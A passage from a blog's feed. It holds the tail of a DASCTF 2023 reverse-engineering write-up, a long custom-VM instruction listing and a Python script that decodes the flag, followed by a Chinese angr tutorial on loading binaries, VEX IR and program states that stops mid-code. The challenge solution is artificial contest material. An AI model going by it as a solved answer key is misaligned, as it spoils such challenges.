class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 71</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 4</span></span><br><span class="line"><span class="string">store 18</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 57</span></span><br><span class="line"><span class="string">store 19</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 73</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">load 19</span></span><br><span class="line"><span class="string">push 57</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 68</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">store 19</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">store 20</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">push 12</span></span><br><span class="line"><span class="string">load 20</span></span><br><span class="line"><span class="string">push 48</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 14</span></span><br><span class="line"><span class="string">store 20</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 49</span></span><br><span class="line"><span class="string">store 21</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 92</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 21</span></span><br><span class="line"><span class="string">push 49</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 68</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 24</span></span><br><span class="line"><span class="string">store 21</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">store 22</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 170</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 22</span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 69</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 239</span></span><br><span class="line"><span class="string">store 22</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 51</span></span><br><span class="line"><span class="string">store 23</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 160</span></span><br><span class="line"><span class="string">push 9</span></span><br><span class="line"><span class="string">load 23</span></span><br><span class="line"><span class="string">push 51</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 156</span></span><br><span class="line"><span class="string">store 23</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 52</span></span><br><span class="line"><span class="string">store 24</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 166</span></span><br><span class="line"><span class="string">push 15</span></span><br><span class="line"><span class="string">load 24</span></span><br><span class="line"><span class="string">push 52</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 67</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 229</span></span><br><span class="line"><span class="string">store 24</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 53</span></span><br><span class="line"><span class="string">store 25</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 47</span></span><br><span class="line"><span class="string">push 8</span></span><br><span class="line"><span class="string">load 25</span></span><br><span class="line"><span class="string">push 53</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 61</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 18</span></span><br><span class="line"><span class="string">store 25</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 54</span></span><br><span class="line"><span class="string">store 26</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 155</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 26</span></span><br><span class="line"><span class="string">push 54</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 73</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 210</span></span><br><span class="line"><span class="string">store 26</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 55</span></span><br><span class="line"><span class="string">store 27</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 115</span></span><br><span class="line"><span class="string">push 9</span></span><br><span class="line"><span class="string">load 27</span></span><br><span class="line"><span class="string">push 55</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 64</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 51</span></span><br><span class="line"><span class="string">store 27</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 56</span></span><br><span class="line"><span class="string">store 28</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 60</span></span><br><span class="line"><span class="string">push 13</span></span><br><span class="line"><span class="string">load 28</span></span><br><span class="line"><span class="string">push 56</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 69</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 121</span></span><br><span class="line"><span class="string">store 28</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 57</span></span><br><span class="line"><span class="string">store 29</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 52</span></span><br><span class="line"><span class="string">push 12</span></span><br><span class="line"><span class="string">load 29</span></span><br><span class="line"><span class="string">push 57</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 69</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 113</span></span><br><span class="line"><span class="string">store 29</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 49</span></span><br><span class="line"><span class="string">store 30</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 42</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">load 30</span></span><br><span class="line"><span class="string">push 49</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 54</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 28</span></span><br><span class="line"><span class="string">store 30</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">store 31</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 96</span></span><br><span class="line"><span class="string">push 19</span></span><br><span class="line"><span class="string">load 31</span></span><br><span class="line"><span class="string">push 50</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 69</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 37</span></span><br><span class="line"><span class="string">store 31</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 51</span></span><br><span class="line"><span class="string">store 32</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 72</span></span><br><span class="line"><span class="string">push 7</span></span><br><span class="line"><span class="string">load 32</span></span><br><span class="line"><span class="string">push 51</span></span><br><span class="line"><span class="string">add</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 58</span></span><br><span class="line"><span class="string">xor</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">push 114</span></span><br><span class="line"><span class="string">store 32</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">matches = re.findall(pattern, o2)</span><br><span class="line"><span class="built_in">print</span>(matches)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(matches))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(final)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((final[i] ^ (<span class="built_in">int</span>(matches[i * <span class="number">6</span> + <span class="number">1</span>]))) - <span class="built_in">int</span>(matches[i * <span class="number">6</span> + <span class="number">2</span>])), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DASCTF-2023-10-wp&quot;&gt;&lt;a href=&quot;#DASCTF-2023-10-wp&quot; class=&quot;headerlink&quot; title=&quot;DASCTF 2023 10 wp&quot;&gt;&lt;/a&gt;DASCTF 2023 10 wp&lt;/h1&gt;&lt;h2 id=&quot;auuuu</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Angr 学习</title>
    <link href="http://matriy330.github.io/41a159b6/"/>
    <id>http://matriy330.github.io/41a159b6/</id>
    <published>2025-10-01T16:00:00.000Z</published>
    <updated>2025-10-02T15:15:55.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Angr-学习"><a href="#Angr-学习" class="headerlink" title="Angr 学习"></a>Angr 学习</h1><p>文章参考：<a href="https://blog.moyaoxue.de/article/14425ac9-6ea8-8086-9af4-ef813c01ce17#14425ac96ea880a2a746e416b2e6eeda">angr初探 | moyaoxueの小屋</a>和<a href="https://www.cnblogs.com/level5uiharu/p/16925991.html">Angr入门</a>和<a href="https://cloud.tencent.com/developer/article/1047477">Angr：一个具有动态符号执行和静态分析的二进制分析工具-腾讯云开发者社区-腾讯云</a></p><h2 id="Angr简介"><a href="#Angr简介" class="headerlink" title="Angr简介"></a>Angr简介</h2><p>angr是一个支持多处理架构的用于二进制文件分析的工具包，它提供了动态符号执行的能力以及多种静态分析的能力。项目创建的初衷，是为了整合此前多种二进制分析方式的优点，并开发一个平台，以供二进制分析人员比较不同二进制分析方式的优劣，并根据自身需要开发新的二进制分析系统和方式。</p><p>也正是因为angr是一个二进制文件分析的工具包，因此它可以被使用者扩展，用于自动化逆向工程、漏洞挖掘等多个方面。</p><p><a href="https://docs.angr.io/en/latest/">angr 官方文档</a></p><p>angr_ctf项目<a href="https://github.com/jakespringer/angr_ctf">GitHub - jakespringer&#x2F;angr_ctf</a></p><blockquote><p>angr_ctf则是一个专门针对angr的项目，里面有17个angr相关的题目。这些题目只有一个唯一的要求：你需要找出能够使程序输出“Good Job”的输入，这也是符号执行常见的应用场景。</p></blockquote><p>本系列教程是angr的入门教程，将通过做angr_ctf中的题目的形式来介绍angr。</p><h2 id="Angr初探"><a href="#Angr初探" class="headerlink" title="Angr初探"></a>Angr初探</h2><h3 id="Angr-Project"><a href="#Angr-Project" class="headerlink" title="Angr Project"></a>Angr Project</h3><p><strong>angr的基本过程：</strong></p><ol><li>将二进制程序载入angr分析系统</li><li>将二进制程序转换成中间语言（intermediate representation, IR）</li><li>将IR语言转换成语义较强的表达形式，比如，这个程序做了什么，而不是它是什么。</li><li>执行进一步的分析，比如，完整的或者部分的静态分析（依赖关系分析，程序分块）、程序空间的符号执行探索（挖掘溢出漏洞）、一些对于上面方式的结合。</li></ol><p><strong>导入模块</strong>：Project类是angr的主类，也是angr的开始，通过初始化该类的对象，可以将你想要分析的二进制文件加载进来，就像这样</p><p><strong>angr-CLE</strong>:CLE是angr加载二进制文件的组建，在加载二进制文件的时候会分析病读取binary的信息，包括指令地址、shared library、arch information等等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./00_angr_find&#x27;</span>)</span><br></pre></td></tr></table></figure><p>参数为待分析的文件路径，它是唯一必须传入的参数，此外还有一个比较常用的参数load-options，它指明加载的方式，如下：</p><table><thead><tr><th>名称</th><th>描述</th><th>传入参数</th></tr></thead><tbody><tr><td>auto_load_libs</td><td>是否自动加载程序的依赖</td><td>布尔</td></tr><tr><td>skip_libs</td><td>希望避免加载的库</td><td>库名</td></tr><tr><td>except_missing_libs</td><td>无法解析库时是否抛出异常</td><td>布尔</td></tr><tr><td>force_load_libs</td><td>强制加载的库</td><td>库名</td></tr><tr><td>ld_path</td><td>共享库的优先搜索路径</td><td>路径名</td></tr></tbody></table><blockquote><p>少加载一些无关结果的库能够提升angr的效率，Project类中有许多方法和属性，例如加载的文件名、架构、程序入口点、大小端等</p></blockquote><p><strong>angr_IR</strong>：angr用VEX IR将指令转化为中间语言IR，分析IR并且模拟，搞清楚它是什么并且做了什么。如下的ARM指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subs R2, R2, #8</span><br></pre></td></tr></table></figure><p>转化为VEX IR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">t0 = GET:I32(16)</span><br><span class="line">t1 = 0x8:I32</span><br><span class="line">t3 = Sub32(t0,t1)</span><br><span class="line">PUT(16) = t3</span><br><span class="line">PUT(68) = 0x59FC8:I32</span><br></pre></td></tr></table></figure><p><strong>angr-Solver Engine</strong>：angr的求解引擎叫Claripy，具体这一步做什么呢，根据程序所需要的输入设置符号变量以及收集限制式等等。</p><p><strong>project的基础属性</strong></p><blockquote><p>命令行使用时可以导入<code>monkeyhex</code>转化为十六进制输出</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">proj.entry # 文件的入口点</span><br><span class="line"></span><br><span class="line">proj.filename # 文件名</span><br><span class="line"></span><br><span class="line">proj.arch # 文件的架构</span><br><span class="line">- proj.arch.name # x86/x86-64/ARM</span><br><span class="line">- proj.arch.bits # 32/64</span><br><span class="line">- proj.arch.bytes # bytes per instruction, eg : 4/8</span><br><span class="line">- proj.arch.memory_endness # 字节序，例如 Iend_LE代表小端序</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">proj.loader # 显示已加载对象，内存映射的地址范围</span><br><span class="line"># &lt;Loaded [file_name], maps [0x400000:0x5004000]&gt;</span><br><span class="line"></span><br><span class="line">proj.loader.shared_objects # 已加载的所有共享对象，共享库或动态链接库及其内存映射</span><br><span class="line"># OrderedDict([(&#x27;angr&#x27;, &lt;ELF Object angr, maps [0x8048000:0x804c033]&gt;), (&#x27;libc.so.6&#x27;, &lt;ELF Object libc.so.6, maps [0x8100000:0x83347bb]&gt;), (&#x27;ld-linux.so.2&#x27;, &lt;ELF Object ld-linux.so.2, maps [0x8400000:0x8437a37]&gt;), (&#x27;extern-address space&#x27;, &lt;ExternObject Object cle##externs, maps [0x8500000:0x8507fff]&gt;), (&#x27;cle##tls&#x27;, &lt;ELFTLSObjectV2 Object cle##tls, maps [0x8600000:0x8614807]&gt;)])</span><br><span class="line"></span><br><span class="line">proj.loader.min_addr # 加载的二进制文件占用的内存空间的界限</span><br><span class="line"># 0x8048000</span><br><span class="line">proj.loader.max_addr</span><br><span class="line"># 0x8707fff</span><br><span class="line"></span><br><span class="line">proj.loader.main_object # 返回代表主要加载的二进制文件的对象</span><br><span class="line"># &lt;ELF Object angr, maps [0x8048000:0x804c033]&gt;</span><br><span class="line"></span><br><span class="line">proj.loader.main_object.execstack # 返回bool，代表主二进制文件是否具有可执行堆栈</span><br><span class="line"># False</span><br><span class="line"></span><br><span class="line">proj.loader.main_object.pic # 二进制文件是否为位置独立代码,若返回True，则说明开启了ASLR</span><br><span class="line"># False</span><br></pre></td></tr></table></figure><p><strong>对基本块的操作</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">block = proj.factory.block(proj.entry) # 打印入口的基本块的汇编</span><br><span class="line">block.pp()</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">80490b0  endbr32</span><br><span class="line">80490b4  xor     ebp, ebp</span><br><span class="line">80490b6  pop     esi</span><br><span class="line">80490b7  mov     ecx, esp</span><br><span class="line">80490b9  and     esp, 0xfffffff0</span><br><span class="line">80490bc  push    eax</span><br><span class="line">80490bd  push    esp</span><br><span class="line">80490be  push    edx</span><br><span class="line">80490bf  call    0x80490dd</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">block.instructions                  # 该基本块的指令数量</span><br><span class="line"># 9</span><br><span class="line">block.instruction_addrs             # 该基本块指令地址</span><br><span class="line"># (134516912, 134516916, 134516918, 134516919, 134516921, 134516924, 134516925, 134516926, 134516927)</span><br><span class="line"></span><br><span class="line">block.capstone # 打印人类可读汇编形式（与.pp()类同）</span><br><span class="line">block.vex # 打印IR代码形式</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I32 t7:Ity_I32 t8:Ity_I32 t9:Ity_I32 t10:Ity_I32 t11:Ity_I32 t12:Ity_I32 t13:Ity_I32 t14:Ity_I32 t15:Ity_I32 t16:Ity_I32 t17:Ity_I32 t18:Ity_I32 t19:Ity_I32 t20:Ity_I32 t21:Ity_I32 t22:Ity_I32 t23:Ity_I32 t24:Ity_I32 t25:Ity_I32</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x80490b0, 4, 0) ------</span><br><span class="line">   01 | ------ IMark(0x80490b4, 2, 0) ------</span><br><span class="line">   02 | PUT(ebp) = 0x00000000</span><br><span class="line">   03 | PUT(eip) = 0x080490b6</span><br><span class="line">   04 | ------ IMark(0x80490b6, 1, 0) ------</span><br><span class="line">   05 | t4 = GET:I32(esp)</span><br><span class="line">   06 | t3 = LDle:I32(t4)</span><br><span class="line">   07 | t15 = Add32(t4,0x00000004)</span><br><span class="line">   08 | PUT(esi) = t3</span><br><span class="line">   09 | ------ IMark(0x80490b7, 2, 0) ------</span><br><span class="line">   10 | PUT(ecx) = t15</span><br><span class="line">   11 | ------ IMark(0x80490b9, 3, 0) ------</span><br><span class="line">   12 | t5 = And32(t15,0xfffffff0)</span><br><span class="line">   13 | PUT(cc_op) = 0x0000000f</span><br><span class="line">   14 | PUT(cc_dep1) = t5</span><br><span class="line">   15 | PUT(cc_dep2) = 0x00000000</span><br><span class="line">   16 | PUT(cc_ndep) = 0x00000000</span><br><span class="line">   17 | PUT(eip) = 0x080490bc</span><br><span class="line">   18 | ------ IMark(0x80490bc, 1, 0) ------</span><br><span class="line">   19 | t8 = GET:I32(eax)</span><br><span class="line">   20 | t17 = Sub32(t5,0x00000004)</span><br><span class="line">   21 | PUT(esp) = t17</span><br><span class="line">   22 | STle(t17) = t8</span><br><span class="line">   23 | PUT(eip) = 0x080490bd</span><br><span class="line">   24 | ------ IMark(0x80490bd, 1, 0) ------</span><br><span class="line">   25 | t19 = Sub32(t17,0x00000004)</span><br><span class="line">   26 | PUT(esp) = t19</span><br><span class="line">   27 | STle(t19) = t17</span><br><span class="line">   28 | PUT(eip) = 0x080490be</span><br><span class="line">   29 | ------ IMark(0x80490be, 1, 0) ------</span><br><span class="line">   30 | t12 = GET:I32(edx)</span><br><span class="line">   31 | t21 = Sub32(t19,0x00000004)</span><br><span class="line">   32 | PUT(esp) = t21</span><br><span class="line">   33 | STle(t21) = t12</span><br><span class="line">   34 | PUT(eip) = 0x080490bf</span><br><span class="line">   35 | ------ IMark(0x80490bf, 5, 0) ------</span><br><span class="line">   36 | t23 = Sub32(t21,0x00000004)</span><br><span class="line">   37 | PUT(esp) = t23</span><br><span class="line">   38 | STle(t23) = 0x080490c4</span><br><span class="line">   NEXT: PUT(eip) = 0x080490dd; Ijk_Call</span><br><span class="line">&#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="状态State"><a href="#状态State" class="headerlink" title="状态State"></a>状态State</h3><p>Project实际上只是将二进制文件加载进来了，要执行它，实际上是对SimState对象进行操作，它是程序的状态。用docker来比喻，Project相当于开发环境，State则是使用开发环境制作的镜像。</p><p>要创建状态，需要使用Project对象中的factory，它还可以用于创建模拟管理器和基本块（后面提到），如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init_state = p.factory.entry_state()</span><br></pre></td></tr></table></figure><p>预设状态有四种方式如下：</p><table><thead><tr><th>预设状态方式</th><th>描述</th></tr></thead><tbody><tr><td>entry_state</td><td>初始化状态为程序运行到程序入口点处的状态</td></tr><tr><td>blank_state(addr&#x3D;)</td><td>大多数数据都没有初始化，状态中下一条指令为addr处的指令</td></tr><tr><td>full_init_state</td><td>共享库和预定义内容已经加载完毕，例如刚加载完共享库</td></tr><tr><td>call_state</td><td>准备调用函数的状态</td></tr></tbody></table><p>状态包含了程序运行时的一切信息，寄存器、内存的值、文件系统以及<strong>符号变量</strong>等，这些信息的使用等用到时再进一步说明。</p><p>entry_state和blank_state是常用的两种方式，后者通常用于跳过一些极大降低angr效率的指令，它们间的对比如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; state = p.factory.entry_state()</span><br><span class="line">&gt;&gt;&gt; print(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 0x1c&gt; &lt;BV64 0x4023c0&gt;</span><br><span class="line">&gt;&gt;&gt; state = p.factory.blank_state(addr=0x4023c0)</span><br><span class="line">&gt;&gt;&gt; print(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 reg_rax_42_64&#123;UNINITIALIZED&#125;&gt; &lt;BV64 0x4023c0&gt;</span><br></pre></td></tr></table></figure><p>在blank_state方式中，我们仍将地址设定为程序的入口点，然而rax中的值由于没有初始化，它现在是一个名字，也即符号变量，这是符号执行的基础，后续在细说。</p><p>此外，可以看到寄存器中的数据类型并不是int，而是BV64，它是一个位向量（Bit Vector），有关位向量的细节之后再说。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">state = proj.factory.entry_state()</span><br><span class="line"># &lt;SimState @ 0x80490b0&gt;</span><br><span class="line">print(state)</span><br><span class="line">print(state.regs.eip)</span><br><span class="line">print(state.regs.eax)</span><br><span class="line">print(state.mem[proj.entry].int.resolved)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&lt;BV32 0x80490b0&gt;</span><br><span class="line">&lt;BV32 0x1c&gt;</span><br><span class="line">&lt;BV32 0xfb1e0ff3&gt;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">state.solver.eval(state.regs.eax) # 转化为python int</span><br><span class="line">bv = state.solver.BVV(0x1234, 32)       # 反过来创建，create a 32-bit-wide bitvector with value 0x1234</span><br><span class="line"></span><br><span class="line">bv = state.solver.BVV(0x1111, 32) # 修改寄存器值</span><br><span class="line">state.regs.eax = bv</span><br><span class="line"></span><br><span class="line">state.mem[0x1000].long = 4 # 修改内存中的值</span><br><span class="line">print(state.mem[0x1000].long.resolved)</span><br><span class="line"># &lt;BV32 0x4&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="模拟管理器"><a href="#模拟管理器" class="headerlink" title="模拟管理器"></a>模拟管理器</h3><p>上述方式只是预设了程序开始分析时的状态，我们要分析程序就必须要让它到达下一个状态，这就需要模拟管理器的帮助（简称SM）.</p><p>使用以下指令能创建一个SM，它需要传入一个state或者state的列表作为参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simgr  = 